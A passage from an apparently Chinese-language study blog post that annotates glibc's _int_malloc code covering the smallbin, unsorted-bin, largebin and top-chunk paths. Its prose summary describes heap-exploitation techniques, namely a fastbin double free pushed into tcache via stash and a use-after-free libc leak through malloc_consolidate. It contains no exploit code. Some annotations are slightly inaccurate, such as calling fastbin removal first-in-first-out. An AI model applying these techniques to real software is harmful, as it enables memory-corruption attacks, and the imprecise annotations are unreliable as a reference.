class="line">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">     processed to find best fit. But for small ones, fits are exact</span><br><span class="line">     anyway, so we can check now, which is faster.)</span><br><span class="line">   */</span><br><span class="line">  //先在smallbin中查询可用chunk 因为smallbin链表类似tcachebin 每个size都有一个链表 查询起来速度快</span><br><span class="line">  if (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);  //获取smallbin的链表头</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;   //取链表的最后一个chunk的上一个chunk</span><br><span class="line">	  if (__glibc_unlikely (bck-&gt;fd != victim))   //安全性检查 如果bck的下一个chunk不是victim 说明链表被破坏</span><br><span class="line">	    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;  //将链表中的最后一个chunk拿去使用 随后恢复链表结构</span><br><span class="line">          bck-&gt;fd = bin; </span><br><span class="line"></span><br><span class="line">          if (av != &amp;main_arena) //如果分配区不是main_arena 设置chunk的arena为非main_arena</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">    //和fastbin中一样 如果smallbin中链表还有其他free chunk 且符合tcachebin的范围 同时tcachebin中有空闲位置 就全部放到tcachebin中</span><br><span class="line">	  /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">	     stash them in the tcache.  */</span><br><span class="line">	  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  if (tc_victim != 0)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      if (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing if there is space available, this avoids</span><br><span class="line">     fragmentation problems normally associated with fastbins.</span><br><span class="line">     Also, in practice, programs tend to have runs of either small or</span><br><span class="line">     large requests, but less often mixtures, so consolidation is not</span><br><span class="line">     invoked all that often in most programs. And the programs that</span><br><span class="line">     it is called frequently in otherwise tend to fragment.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;   //如果是从largebin中分配 就会触发malloc_consolidate来合并chunk 这个以前也有学过</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     Process recently freed or remaindered chunks, taking one only if</span><br><span class="line">     it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="line">     the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="line">     bins.  Note that this step is the only place in any routine where</span><br><span class="line">     chunks are placed in bins.</span><br><span class="line"></span><br><span class="line">     The outer loop here is needed because we might not realize until</span><br><span class="line">     near the end of malloc that we should have consolidated, so must</span><br><span class="line">     do so and retry. This happens at most once, and only when we would</span><br><span class="line">     otherwise need to expand memory to service a &quot;small&quot; request.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE </span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = 0;</span><br><span class="line">  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  //判断请求大小是否属于tcachebin的范围</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  int return_cached = 0;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = 0;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  for (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      int iters = 0;</span><br><span class="line">      //判断链表头的上一个chunk是否为链表头本身 如果是 那么链表中无空闲chunk 不进入while循环</span><br><span class="line">      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;  //获取链表中的最后一个chunk</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址</span><br><span class="line">          if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)   //安全性检查</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)  //检查下一个chunk的size是否符合要求</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))  //检查next_chunk的prev_size是否正确</span><br><span class="line">            malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">          if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             If a small request, try to use last remainder if it is the</span><br><span class="line">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="line">             runs of consecutive small requests. This is the only</span><br><span class="line">             exception to best-fit, and applies only when there is</span><br><span class="line">             no exact fit for a small chunk.</span><br><span class="line">           */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (nb) &amp;&amp;   //如果请求大小属于small chunk 同时victim的size大于申请的size </span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;   //这一点要注意 check的是bck和main_arena中对应链表的指针 如果是通过填满tcache来把chunk释放进入unsortedbin的方式 还需要先随便申请一个小chunk才能触发这个if分支 具体原因就是第一次申请chunk的时候 unsorted_chunks(av)的值为0</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              /* split and reattach remainder */</span><br><span class="line">              remainder_size = size - nb;   //从剩余的空间中分割chunk</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              if (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                  remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* remove from unsorted list */</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim))  //安全性检查</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          /* Take now instead of binning if exact fit */</span><br><span class="line"></span><br><span class="line">          if (size == nb)  //如果申请的chunk大小和剩余的大小一致 就走这个分支</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">	      /* Fill cache first, return to user only if cache fills.</span><br><span class="line">		 We may return one of these chunks later.  */</span><br><span class="line">	      if (tcache_nb            //如果有tcachebin 就先把这个chunk放到tcachebin中</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = 1;</span><br><span class="line">		  continue;</span><br><span class="line">		&#125;</span><br><span class="line">	      else</span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">		&#125;</span><br><span class="line">#endif</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* place chunk in bin */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (size))   //这里根据chunk的大小来判断要放入smallbin还是largebin</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              /* maintain large bins in sorted order */  //这一段是largebin按照大小排序的部分</span><br><span class="line">              if (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">		      &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      while ((unsigned long) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      if ((unsigned long) size</span><br><span class="line">			  == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                        /* Always insert in the second position.  */</span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      else</span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      if (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              else</span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="line">	 filling the cache, return one of the cached ones.  */ </span><br><span class="line">      ++tcache_unsorted_count;   //检查tcachebin链表中的chunk是否超过范围</span><br><span class="line">      if (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  return tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define MAX_ITERS       10000</span><br><span class="line">          if (++iters &gt;= MAX_ITERS)</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If all the small chunks we found ended up cached, return one now.  */</span><br><span class="line">      if (return_cached)  //如果之前把chunk放到tcachebin里面 这里取出来就可以了</span><br><span class="line">	&#123;</span><br><span class="line">	  return tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         If a large request, scan through the chunks of current bin in</span><br><span class="line">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="line">       */</span><br><span class="line">      //如果申请的chunk大小在largebin的范围里 就扫描largebinchunk来查找最合适的chunk</span><br><span class="line">      if (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          /* skip scan if empty or largest chunk is too small */</span><br><span class="line">          if ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (unsigned long) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (unsigned long) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              while (((unsigned long) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (unsigned long) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              /* Avoid removing the first entry for a size so that the skip</span><br><span class="line">                 list does not have to be rerouted.  */</span><br><span class="line">              if (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              /* Exhaust */</span><br><span class="line">              if (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              /* Split */</span><br><span class="line">              else</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">                     have to perform a complete insert here.  */</span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (&quot;malloc(): corrupted unsorted chunks&quot;);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  if (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                      remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         Search for a chunk by scanning bins, starting with next largest</span><br><span class="line">         bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="line">         (with ties going to approximately the least recently used) chunk</span><br><span class="line">         that fits is selected.</span><br><span class="line"></span><br><span class="line">         The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="line">         The particular case of skipping all bins during warm-up phases</span><br><span class="line">         when no chunks have been returned yet is faster than it might look.</span><br><span class="line">       */</span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);   //后面这一部分关于内存桶的 暂时没看懂</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      map = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      for (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          /* Skip rest of block if there are no more set bits in this block.  */</span><br><span class="line">          if (bit &gt; map || bit == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              do</span><br><span class="line">                &#123;</span><br><span class="line">                  if (++block &gt;= BINMAPSIZE) /* out of bins */</span><br><span class="line">                    goto use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              while ((map = av-&gt;binmap[block]) == 0);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Advance to bin with set bit. There must be one. */</span><br><span class="line">          while ((bit &amp; map) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">              assert (bit != 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* Inspect the bin. It is likely to be non-empty */</span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          /*  If a false alarm (empty bin), clear the bit. */</span><br><span class="line">          if (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= 1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              /*  We know the first chunk in this bin is big enough to use. */</span><br><span class="line">              assert ((unsigned long) (size) &gt;= (unsigned long) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              /* unlink */</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              /* Exhaust */</span><br><span class="line">              if (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              /* Split */</span><br><span class="line">              else</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">                     have to perform a complete insert here.  */</span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (&quot;malloc(): corrupted unsorted chunks 2&quot;);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  /* advertise as last remainder */</span><br><span class="line">                  if (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  if (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                      remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      /*</span><br><span class="line">         If large enough, split off the chunk bordering the end of memory</span><br><span class="line">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="line">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="line">         less well fitting) than any other available chunk since it can</span><br><span class="line">         be extended to be as large as necessary (up to system</span><br><span class="line">         limitations).</span><br><span class="line"></span><br><span class="line">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="line">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="line">         exhausted by current request, it is replenished. (The main</span><br><span class="line">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="line">         to put in fenceposts in sysmalloc.)</span><br><span class="line">       */</span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      if (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (&quot;malloc(): corrupted top size&quot;);</span><br><span class="line"></span><br><span class="line">      if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* When we are using atomic ops to free fast chunks we can get</span><br><span class="line">         here for all block sizes.  */</span><br><span class="line">      else if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          /* restore original bin index */</span><br><span class="line">          if (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          else</span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">         Otherwise, relay to handle system-dependent cases</span><br><span class="line">       */</span><br><span class="line">      else</span><br><span class="line">        &#123;</span><br><span class="line">          void *p = sysmalloc (nb, av);</span><br><span class="line">          if (p != NULL)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这几百行代码读下来 感觉还是有点蒙蔽的  总结一下<br>首先判断nb是否属于fastbin的范围 如果属于则获取fastbin对应链表的链表头 当链表中存在空闲chunk的时候 将chunk从fastbin链表中取出(遵从先进先出原则) 同时 如果开启了tcachebin机制 当tcachebin对应链表尚有空闲(一条链表默认最大存储7个chunk) 并且fastbin该链表中取出一个chunk后 仍有剩余 就会触发tcache stash机制 会将fastbin链表中的chunk转移到tcachebin中<br>这一机制存在漏洞利用的可能 在glibc2.29以后 tcachebin针对double free进行了安全防护 当chunk被释放进入链表后 chunk的bk域就会被写入key key的值为堆地址去除后三位 攻击者需要更改key 才能实现double free 而fastbin对于double free的检查 只会比较上一次和这次释放的指针是否一致 所以就可以通过在fastbin中实现double free 然后触发tcache stash来将链表放到tcachebin中<br>接着如果nb大小在smallbin的范围内 就遍历smallbin 因为smallbin的链表和fastbin tcachebin一样 每一个范围内的大小都有一个链表 查询起来更加快速 这一段代码同样引入了tcache stash机制 来确保内存申请的效率<br>如果nb的大小在largebin的范围内 就会调用malloc_consolidata函数 这个函数会合并物理相邻的fastbin chunk 很多时候 这一个函数也会导致许多漏洞 比如此时两个物理相邻的fastbin chunkA和B 如果用户手里有UAF的权限 在触发malloc_consolidata之前 控制的只是一个fastbin chunk 触发只会 就会合并成smallbin chunk 此时chunk的fd和bk域就填充了libc真实地址 如果用户利用UAF漏洞 就可以泄露libc基址<br>接下来的代码负责处理从unsortedbin中申请chunk 最为关键的就是如下这些check 这些check保证了攻击者不会构造unsortedbin chunk的fd域和bk域 从而实现任意地址申请chunk以及任意地址写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;  //获取链表中的倒数第二个chunk</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址</span><br><span class="line">          if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)   //安全性检查</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)  //检查下一个chunk的size是否符合要求</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))  //检查next_chunk的prev_size是否正确</span><br><span class="line">            malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">          if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid 